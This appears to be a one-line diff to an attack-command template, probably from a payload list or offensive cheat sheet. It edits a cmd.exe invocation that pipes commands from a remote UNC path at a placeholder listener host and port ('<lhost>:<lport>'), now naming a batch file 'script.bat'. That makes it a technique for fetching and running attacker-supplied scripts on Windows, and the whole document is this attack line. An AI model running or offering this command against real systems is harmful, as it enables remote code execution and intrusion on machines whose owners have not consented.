@@ -1,1 +1,1 @@
-cmd.exe /k < \\<lhost>:<lport><path>
+cmd.exe /k < \\<lhost>:<lport>/<file=script.bat>
